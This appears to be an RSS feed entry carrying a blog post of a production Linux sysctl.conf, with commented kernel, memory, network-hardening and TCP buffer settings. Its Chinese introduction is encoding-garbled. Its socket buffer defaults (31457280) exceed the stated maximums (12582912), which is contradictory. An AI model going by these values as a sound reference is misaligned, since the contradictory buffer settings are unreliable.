      <description>&lt;p&gt;è¿™ç¯‡æ˜¯çº¯é…ç½®ç¯‡ï¼Œè§£é‡Šéƒ½åœ¨é…ç½®é‡Œäº†ï¼Œæ˜¯ç”Ÿäº§æœåŠ¡å™¨ sysctl.conf çš„é…ç½®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### KERNEL ###&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Reboot after 10sec. on kernel panic&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;kernel.panic&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### IMPROVE SYSTEM MEMORY MANAGEMENT ###&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Increase size of file handles and inode cache&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;fs.file-max&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;2097152&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Insure we always have enough memory&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;vm.min_free_kbytes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;8192&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Do less swapping&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;vm.swappiness&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;vm.dirty_ratio&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;vm.dirty_background_ratio&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### GENERAL NETWORK SECURITY OPTIONS ###&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Avoid a smurf attack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.icmp_echo_ignore_broadcasts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Turn on protection for bad icmp error messages&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.icmp_ignore_bogus_error_responses&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Turn on syncookies for SYN flood attack protection&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_syncookies&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_max_syn_backlog&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;8192&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Turn on timestamping&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_timestamps&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Turn on and log spoofed, source routed, and redirect packets&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.conf.all.log_martians&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.conf.default.log_martians&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# No source routed packets here&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.conf.all.accept_source_route&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.conf.default.accept_source_route&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Turn on reverse path filtering&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.conf.all.rp_filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.conf.default.rp_filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Make sure no one can alter the routing tables&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.conf.all.accept_redirects&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.conf.default.accept_redirects&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.conf.all.secure_redirects&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.conf.default.secure_redirects&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Don&amp;#39;t act as a router&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.ip_forward&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.conf.all.send_redirects&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.conf.default.send_redirects&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Number of times SYNACKs for passive TCP connection.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_synack_retries&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Allowed local port range&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.ip_local_port_range&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1024 65000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Protect Against TCP Time-Wait&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_rfc1337&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Decrease the time default value for tcp_fin_timeout connection&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_fin_timeout&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;15&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Decrease the time default value for connections to keep alive&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_keepalive_time&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;300&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_keepalive_probes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_keepalive_intvl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;15&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# This means that the keepalive process waits 300 seconds for socket &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# activity before sending the first keepalive probe, and then resend&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# it every 15 seconds. If no ACK response is received for 5 consecutive &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# times (75s in this case), the connection is marked as broken.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;### TUNING NETWORK PERFORMANCE ###&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Disable IPv6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv6.conf.all.disable_ipv6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv6.conf.default.disable_ipv6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv6.conf.lo.disable_ipv6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Default Socket Receive Buffer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.core.rmem_default&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;31457280&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Maximum Socket Receive Buffer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.core.rmem_max&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;12582912&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Default Socket Send Buffer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.core.wmem_default&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;31457280&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Maximum Socket Send Buffer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.core.wmem_max&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;12582912&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Increase number of incoming connections&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.core.somaxconn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;5000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Increase number of incoming connections backlog&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.core.netdev_max_backlog&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;65536&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Enable TCP window scaling&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_window_scaling&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Increase the maximum amount of option memory buffers&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.core.optmem_max&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;25165824&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Increase the maximum total buffer-space allocatable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# This is measured in units of pages (4096 bytes)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_mem&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;65536 131072 262144&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.udp_mem&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;65536 131072 262144&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Increase the read-buffer space allocatable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_rmem&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;8192 87380 16777216&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.udp_rmem_min&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;16384&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Increase the write-buffer-space allocatable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.tcp_wmem&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;8192 65536 16777216&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;net.ipv4.udp_wmem_min&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;16384&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
